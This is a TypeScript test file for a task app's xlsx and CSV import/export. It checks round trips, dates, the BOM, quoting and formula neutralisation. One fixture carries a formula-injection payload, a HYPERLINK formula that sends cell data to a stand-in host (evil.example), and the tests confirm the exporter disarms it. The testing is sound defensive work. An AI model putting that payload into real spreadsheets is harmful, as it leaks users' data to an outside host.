import { describe, expect, it } from "vitest";
import {
  buildExchangeCsv,
  buildExchangeWorkbook,
  type ExchangeSheet,
} from "../../../../apps/api/src/task/exchange/build-file";
import {
  cellText,
  FileParseError,
  looksLikeXlsx,
  parseUploadedFile,
} from "../../../../apps/api/src/task/exchange/parse-file";

const sheet: ExchangeSheet = {
  sheetName: "Tareas",
  indentColumn: 3,
  columns: [
    { header: "ID", kind: "text" },
    { header: "Esquema", kind: "text" },
    { header: "Título", kind: "text", width: 40 },
    { header: "Descripción (HTML)", kind: "text", hidden: true },
    { header: "Fecha límite", kind: "date" },
    { header: "Estimación (h)", kind: "number" },
  ],
  rows: [
    {
      cells: ["t1", "1", "Instalación Norte", "<p>Obra</p>", null, null],
      outlineLevel: 0,
    },
    {
      cells: [
        "t2",
        "1.1",
        "Cableado",
        "<p>Con <strong>CAT6</strong></p>",
        new Date("2026-09-15T00:00:00Z"),
        7.5,
      ],
      outlineLevel: 1,
    },
    {
      // `1.10` es el caso que colapsaria a `1.1` si la columna no fuera texto.
      cells: ["t3", "1.10", 'Cuadro, "principal"', null, null, null],
      outlineLevel: 1,
    },
  ],
};

describe("the xlsx round trip", () => {
  it("reads back every value it wrote", async () => {
    const buffer = await buildExchangeWorkbook(sheet);
    const parsed = await parseUploadedFile(buffer, "tareas.xlsx");

    expect(parsed.headers).toEqual([
      "ID",
      "Esquema",
      "Título",
      "Descripción (HTML)",
      "Fecha límite",
      "Estimación (h)",
    ]);
    expect(parsed.rows).toHaveLength(3);
    expect(parsed.rows.map((row) => cellText(row[2]))).toEqual([
      "Instalación Norte",
      "Cableado",
      'Cuadro, "principal"',
    ]);
  });

  it("keeps 1.10 apart from 1.1", async () => {
    const buffer = await buildExchangeWorkbook(sheet);
    const parsed = await parseUploadedFile(buffer, "tareas.xlsx");

    expect(parsed.rows.map((row) => cellText(row[1]))).toEqual([
      "1",
      "1.1",
      "1.10",
    ]);
  });

  it("keeps the day of a date whatever the container timezone is", async () => {
    const buffer = await buildExchangeWorkbook(sheet);
    const parsed = await parseUploadedFile(buffer, "tareas.xlsx");

    expect(cellText(parsed.rows[1]?.[4] ?? null)).toBe("2026-09-15");
  });

  it("hides the HTML column without dropping its content", async () => {
    const buffer = await buildExchangeWorkbook(sheet);

    const workbook = new (await import("exceljs")).default.Workbook();
    await workbook.xlsx.load(buffer as unknown as ArrayBuffer);
    const worksheet = workbook.getWorksheet("Tareas");

    expect(worksheet?.getColumn(4).hidden).toBe(true);
    expect(worksheet?.getCell("D3").value).toBe(
      "<p>Con <strong>CAT6</strong></p>",
    );
  });

  it("groups the rows so the tree folds in Excel", async () => {
    const buffer = await buildExchangeWorkbook(sheet);

    const workbook = new (await import("exceljs")).default.Workbook();
    await workbook.xlsx.load(buffer as unknown as ArrayBuffer);
    const worksheet = workbook.getWorksheet("Tareas");

    expect(worksheet?.getRow(2).outlineLevel).toBe(0);
    expect(worksheet?.getRow(3).outlineLevel).toBe(1);
  });
});

describe("the csv round trip", () => {
  it("reads back every value it wrote", async () => {
    const buffer = buildExchangeCsv(sheet);
    const parsed = await parseUploadedFile(buffer, "tareas.csv");

    expect(parsed.headers).toEqual([
      "ID",
      "Esquema",
      "Título",
      "Descripción (HTML)",
      "Fecha límite",
      "Estimación (h)",
    ]);
    expect(parsed.rows.map((row) => cellText(row[2]))).toEqual([
      "Instalación Norte",
      "Cableado",
      'Cuadro, "principal"',
    ]);
  });

  it("keeps 1.10 apart from 1.1", async () => {
    const parsed = await parseUploadedFile(buildExchangeCsv(sheet), "t.csv");

    expect(parsed.rows.map((row) => cellText(row[1]))).toEqual([
      "1",
      "1.1",
      "1.10",
    ]);
  });

  it("opens in Excel with the accents intact", () => {
    const buffer = buildExchangeCsv(sheet);

    // Sin el BOM, Excel lee el fichero en la codificacion del sistema y
    // "Instalación" sale como "InstalaciÃ³n".
    expect(buffer.subarray(0, 3)).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });

  it("quotes what would otherwise break the row", async () => {
    const parsed = await parseUploadedFile(buildExchangeCsv(sheet), "t.csv");

    expect(cellText(parsed.rows[2]?.[2] ?? null)).toBe('Cuadro, "principal"');
  });

  const formulas: ExchangeSheet = {
    sheetName: "Tareas",
    indentColumn: 1,
    columns: [
      { header: "Título", kind: "text" },
      { header: "Estimación (h)", kind: "number" },
    ],
    rows: [
      {
        cells: ['=HYPERLINK("http://evil.example/?d="&A1)', -5],
        outlineLevel: 0,
      },
      { cells: ["+34 600 000 000", null], outlineLevel: 0 },
      { cells: ["-coste de material", null], outlineLevel: 0 },
      { cells: ["@SUM(A1:A9)", null], outlineLevel: 0 },
      { cells: ["\tTabulado", null], outlineLevel: 0 },
    ],
  };

  it("never lets a text cell run as a formula when Excel opens it", () => {
    const lines = buildExchangeCsv(formulas).toString("utf8").split("\r\n");

    expect(lines[1]).toBe(`" =HYPERLINK(""http://evil.example/?d=""&A1)",-5`);
    expect(lines[2]).toBe(" +34 600 000 000,");
    expect(lines[3]).toBe(" -coste de material,");
    expect(lines[4]).toBe(" @SUM(A1:A9),");
    expect(lines[5]).toBe(" \tTabulado,");
  });

  it("reads formula-looking text back exactly as it was written", async () => {
    const parsed = await parseUploadedFile(buildExchangeCsv(formulas), "t.csv");

    expect(parsed.rows.map((row) => cellText(row[0]))).toEqual([
      '=HYPERLINK("http://evil.example/?d="&A1)',
      "+34 600 000 000",
      "-coste de material",
      "@SUM(A1:A9)",
      // El importador recorta los extremos de toda celda, que es justo lo
      // que deshace el espacio que puso la exportacion.
      "Tabulado",
    ]);
    expect(cellText(parsed.rows[0]?.[1] ?? null)).toBe("-5");
  });

  // El desarme no se deshace al leer: un CSV cualquiera no salio de aqui, y
  // quitarle la comilla de delante se comeria la que escribio una persona.
  it("leaves a hand-written apostrophe where its author put it", async () => {
    const csv = Buffer.from(
      "\ufeffT\u00edtulo,Estado\r\n'-Urgente-',Por hacer\r\n",
    );
    const parsed = await parseUploadedFile(csv, "x.csv");

    expect(cellText(parsed.rows[0]?.[0] ?? null)).toBe("'-Urgente-'");
  });
});

describe("parseUploadedFile", () => {
  it("tells the two formats apart by content, not by name", async () => {
    const workbook = await buildExchangeWorkbook(sheet);

    expect(looksLikeXlsx(workbook)).toBe(true);
    expect(looksLikeXlsx(buildExchangeCsv(sheet))).toBe(false);

    // Un `.xlsx` renombrado a `.csv` se sigue leyendo bien.
    const parsed = await parseUploadedFile(workbook, "tareas.csv");
    expect(parsed.rows).toHaveLength(3);
  });

  it("refuses an empty file", async () => {
    await expect(parseUploadedFile(Buffer.alloc(0), "x.csv")).rejects.toThrow(
      FileParseError,
    );
  });

  it("drops the blank rows a spreadsheet drags along", async () => {
    const csv = Buffer.from("﻿Título,Estado\r\nUna,Por hacer\r\n,\r\n");
    const parsed = await parseUploadedFile(csv, "x.csv");

    expect(parsed.rows).toHaveLength(1);
  });
});
